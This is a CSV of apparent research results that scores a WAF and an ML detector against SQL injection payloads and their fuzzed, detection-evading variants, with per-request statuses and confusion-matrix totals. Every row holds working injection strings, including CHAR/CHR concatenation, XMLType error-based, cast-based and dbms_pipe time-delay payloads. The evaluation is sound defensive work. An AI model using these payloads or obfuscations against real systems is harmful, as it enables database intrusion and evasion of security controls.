Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
45,2024-12-16T18:08:40.813647,1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'kkgt'  =  'kkgt,403,403,200,waf_correct_ml_incorrect,(sElEcT 1)'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (	 106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  5146 NOT LIKE 5147  )   end   ) /**/  )   +char  (   AND 1  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'kkgt'  =  'kkgt,2024-12-16T18:08:58.950920,403,200,waf_correct_ml_incorrect,(SeleCT (SELECT 1))'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (	 'xX'<>'xXk'  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  5146 NOT LIKE 5147  )   end   ) /*0*/  )   +char  (   AND 1  )  +char  (  (SELECT 1)  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )	  and    (    (     (/**/ 'kkgt'  =  'kkgt,2024-12-16T18:09:19.429724,403,200,waf_correct_ml_incorrect,"(SEleCT (sELEct 1))'   )    )     )   and 3715 in    (    (   char  (   AND 1  )  +char  (  113  )  +char  (  112  )  +char  (	 'xX'<>'xXk'  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  821=821  )   then char  (  49  )   else char  (  5146 NOT LIKE 5147  )   end   ) /**/  )   +char  (   AND 1  )  +char  (  (SELECT 1)  )  +char  (  118  )  +char  (  0x7a  )  +char  (  113   )    )     )	 
and    (    (     (  'kkgt'  =  'kkgt",2024-12-16T18:09:41.284693,403,200,waf_correct_ml_incorrect,"(SEleCt (sELECT 1))'   )    )     )   and 3715 in    (    (   char  (   AND  AND 1  )  +char  (  113  )  +char  (  (SELECT 112)  )  +char  (	 'xX'<>'xXk'  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  2240 NOT LIKE 2241=821  )   then char  (  49  )   else
char  (  5146 NOT LIKE 5147  )   end   ) /**/  )  /**/+char  (   AND 1  )  +char  (  (SELECT 1)  )  +char  (  118  )  +char  (  0x7a  )  +char  (  113   )    )     )	 
and    (    (     (  'kkgt'  =  'kkgt",2024-12-16T18:10:03.337881,403,200,waf_correct_ml_incorrect,"(SElEct (SELECt 1))'   )    )     )   and 3715 in    (    (   char 	(   AND  AND 1  )  +char  (  113  )  +char  (  (SELECT (SELECT 8319)=8319)  )  +char  (	 'xX'<>'xXk'  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  2240 NOT LIKE 2241=821  )   then char  (  49  )   else
char  (  5146 NOT LIKE 5147  )   end   ) /**/  )   +char  (   AND 1  )  +char  (  (SELECT 1)  )  +char  (  118  )  +char  (  0x7a  )  +char  (   OR 0   )    )     )	 
and    (    (     (  'kkgt'  =  'kkgt",2024-12-16T18:10:26.918379,403,403,both_correct
46,2024-12-16T18:10:51.055449,1'||  (  select 'yucg' where 2576  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',403,403,200,waf_correct_ml_incorrect,"1'||  (  select 'yucg' where 2576  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  (SELECT 1)  )  ||chr  (  112  )  ||chr  (  106  )  ||chr
 (  113  )/**/ ||  (  select   (  case when   (  '?'!='?#'  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  0x71  )  ||chr  (  62   )    )     )   from dual   )    )   ||'",2024-12-16T18:11:11.972054,403,200,waf_correct_ml_incorrect," AND 1'||  (  select 'yucg' where 2576  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr
 (  60  )  ||chr  (  58  )  ||chr  (/**/ 113  )  ||chr  (  (SELECT 1)  )  ||chr  (  0x70  )  ||chr  (  106  )  ||chr
 (  113  )/**/ ||  (  select   (  case when   (  '?'!='?#'  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  '^'='^'  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  0x71  )  ||chr  (  62   )    )     )   from dual   )    )   ||'",2024-12-16T18:11:34.555295,403,200,waf_correct_ml_incorrect," && 1'||  (  select 'yucg' where 2576  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr	 (  60  )  ||chr  (  58  )  ||chr  (/**/ (SELECT 1)  )  ||chr  (  (SELECT 0x1)  )  ||chr  (  0x70  )  ||chr/**/ (  106  )  ||chr
 (  113  )/*vJr*/ ||  (  select   (  case when   (  '?'!='?#'  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  '^'='^'  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  0x71  )  ||chr  (  211!=212   )    )     )   from dual   )    )   ||'",2024-12-16T18:11:57.767465,403,200,waf_correct_ml_incorrect,"  and  1'||  (  select 'yucg' where  OR 0  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr	 (  60  )  ||chr  (  58  )  ||chr  (/**/ (SELECT 1)  )  ||chr  (  (SELECT 0x1)  )  ||chr  (  0x70  )  ||chr/**/ (  (SELECT 106)  )  ||chr
 (  113  )/*vJr*/ ||  (  select	  (  case when   (  '?'!='?#'  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  '^'='^'  )  ||chr  (  122  )  ||chr  (  1012 LIKE 1012  )  ||chr  (  122/**/ )  ||chr  (  0x71  )  ||chr  (  211!=212   )    )     )   from dual   )    )   ||' @",2024-12-16T18:12:22.092127,403,200,waf_correct_ml_incorrect,"  And  1'||  (  select 'yucg' where  OR 0  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr	 (  0x3c  )  ||chr  (  58  )  ||chr  (/*?lu)E*/ (SELECT 1)  )  ||chr  (  (SELECT 0x1)  )  ||chr  (  0x70  )  ||chr/**/ (  (SELECT 106)  )  ||chr
 (  113  )/*vJr*/ ||  (  select	  (  case when   (  '?'!='?#' 
=  1579 NOT LIKE 1580  )   then 1 else/**/0 end  )   from dual  )  ||chr  (  '^'='^'  )  ||chr  (   OR 0  )  ||chr  (  1012 LIKE 1012  )  ||chr  (  122/**/ )  ||chr  (  0x71  )  ||chr  (  211!=212   )    )     )   from dual   )    )   ||' @",2024-12-16T18:12:47.623402,403,200,waf_correct_ml_incorrect
47,2024-12-16T18:13:14.269710,5537,200,200,403,waf_correct_ml_incorrect,/**/||	6920=0x1b08,2024-12-16T18:13:14.592058,200,200,both_correct,/* />*/|| 0x1b08/**/LIkE 0x1b08,2024-12-16T18:13:16.551960,200,200,both_correct,"/* />*/ Or 
0x1b08/*J*/Like/**/0x1b08",2024-12-16T18:13:19.125523,200,200,both_correct,"/* />*//**/||	
0x1b08/**/lIKE/**/0x1b08",2024-12-16T18:13:21.960931,200,200,both_correct,/* />*//**/ or 		0x1b08 LiKe/*bZI*/0x1b08,2024-12-16T18:13:24.903316,200,200,both_correct
48,2024-12-16T18:13:27.941476,"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",403,403,200,waf_correct_ml_incorrect,"-4830""   )    )     )   or 3440/**/ =  cast   (    (   chr  (  113  ) 	||chr  (  113  )  ||chr  (  112  )  ||chr  (  4838<>4839  )  ||chr  (   AND 1   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  (SELECT 122)  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",2024-12-16T18:13:46.460023,403,200,waf_correct_ml_incorrect,"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  ) 	||chr
 (  113  )  ||chr  (  112  )  ||chr  (  4838<>4839  )  ||chr  (   AND 1   )    )   ||  (  select   (  case when   (  0xd70  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  (SELECT (SELECT 1))  )  ||chr  (  118  )  ||chr  (  '8' NOT LIKE '89'  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",2024-12-16T18:14:06.863525,403,200,waf_correct_ml_incorrect,"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  ) 	||chr
 (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  4838<>4839  )  ||chr	 (   AND 1   )    )   ||  (/**/ select   (  case when   (  0xd70  =  'C'<>'C\'  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  (SELECT (SELECT 1))  )  ||chr  (  118  )  ||chr  (  '(SELECT 1)' NOT LIKE '89'  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",2024-12-16T18:14:28.123830,403,200,waf_correct_ml_incorrect,"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  (SELECT 1)  ) 	||chr
 (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  4838<>4839  ) /**/||chr
 (   AND 1   )    )   ||  (/**/ select   (  case when   (  0xd70  =  'C'<>'C\'  )   then 6367=6367 else (SELECT 0) end   )    )   ::text||  (  chr  (  113  )  ||chr  (  (SELECT (SELECT 1))  )  ||chr  (  118  )  ||chr  (  '(SELECT 1)' NOT LIKE '89'  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",2024-12-16T18:14:50.481517,403,403,both_correct,"-(SELECT 1)""   )    )     )   or 3440  =  cast   (    (   chr  (  (SELECT 1)  ) 	||chr  (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  4838<>4839  ) /**/||chr
 (   AND 1   )    )   ||  (  select   (  case when   (  0xd70  =  'C'<>'C\'  )   then 6367=6367 else (SELECT 6871<>6872) end   )    )   ::text||  (  chr  (  113  )  ||chr  (  (SELECT (SELECT 1))  )  ||chr  (  118  )  ||chr  (  '(SELECT (SELECT 1))' NOT LIKE '89'  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",2024-12-16T18:15:14.218019,403,403,both_correct
49,2024-12-16T18:15:39.016187,"c/ animas, 101,",200,200,200,both_correct,"c/	animas, (SelEcT/**/3705 IN (3704,3705,0xe7a)),",2024-12-16T18:15:39.860015,403,200,waf_incorrect_ml_correct,"c/ animas, (seLecT/*A(D&*/7127 LIKE 7127 in (3704,(SELECT/**/ OR 0),0xe7a)),",2024-12-16T18:15:43.215242,403,403,both_incorrect,"c/ animas,	(select/*A(D&*/7127 lIKE 7127 iN ( AND 1,(seLECt  oR 394 not like (SELECT 395)),0xe7a)),",2024-12-16T18:15:47.934568,403,403,both_incorrect,"c/ animas,
(SeLECT/*A(D&*/7127 liKE 7127 iN/*0*/( anD '+`'<>'+`k',(SELEcT  or (SELECT 394) not like (sELEct  OR 0)),0xe7a)),",2024-12-16T18:15:53.682847,403,403,both_incorrect,"c/ animas,	(SElECT/*A(D&*/7127 LikE 7127 In/*(SELECT '[E#' NOT LIKE '[E#'')*/( anD '+`'<>'+`k',(sELeCt  Or (sELEcT (seLeCT 394)) not/**/liKE (SeLECT  oR 0)),0xe7a)),",2024-12-16T18:16:00.823463,403,403,both_incorrect
50,2024-12-16T18:16:09.653093,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",403,403,200,waf_correct_ml_incorrect,"1'  )   wHere 7007   LIKe   7007 OR/**/0x1d03  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (   AND 'K/]d' NOT LIKE 'K/]dC'  )  ||chr  (  90  )  ||chr  (  109  )  ,5	 )  --",2024-12-16T18:16:16.640468,403,200,waf_correct_ml_incorrect,"1'  )   wHere 7007   LIKe   7007 OR/**/0x1d03  =  dbms_pipe.receive_message  (  chr  (  '='!='=:'  )  ||chr  (   AND 'K/]d' NOT LIKE 'K/]dC'  )   OR chr  (  90 
)  ||chr  (  109  )/**/ ,(SelEct 0x1)	 )  --",2024-12-16T18:16:26.480636,403,200,waf_correct_ml_incorrect,"1'  )   wHere (SELECT 7007)   LIKe   7007 OR/**/0x1d03  =  dbms_pipe.receive_message  (  chr  (  '='!='=:'  )  ||chr  (   AND 'K/]d' NOT LIKE 'K/]dC'  )   OR chr  (  '3'='3'  )   Or chr  (  (SElect 1)  )  ,(seLeCT 0x1)	 )  --",2024-12-16T18:16:37.065854,403,403,both_correct,"0x1'  )   wHere (SELECT  OR 0) 	 LIKe   7007 OR 0x1d03  =  dbms_pipe.receive_message  (  chr  (  ' likE '!='=:'  )  ||chr  (   AND 'K/]d' NOT LIKE 'K/]dC'  )   OR chr  (  '3'='3'  )   or chr  (  (SELecT '~' NOT LIKE '~B')  )  ,(selEct 0x1)	 )  --",2024-12-16T18:16:48.738049,403,403,both_correct,"0x1'  )   wHere (SELECT  OR (SELECT 'r' NOT LIKE 'r-')) 	 LIKe   0x1b5f OR 0x1d03  =/**/ dbms_pipe.receive_message  (  chr  (  ' LikE '!=' Like :'  )  ||chr  (   AND 'K/]d' NOT LIKE 'K/]dC'  )   OR chr  (  '3'='3'  )   or chr  (  (SELecT '~' NOT LIKE '~B')  )  ,(SELECt 0x1)
 )  --",2024-12-16T18:17:01.131997,403,403,both_correct

Overall Results
WAF TP,146
WAF TN,118
WAF FP,20
WAF FN,16
ML TP,81
ML TN,109
ML FP,29
ML FN,81

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,169,21
ML Incorrect,95,15
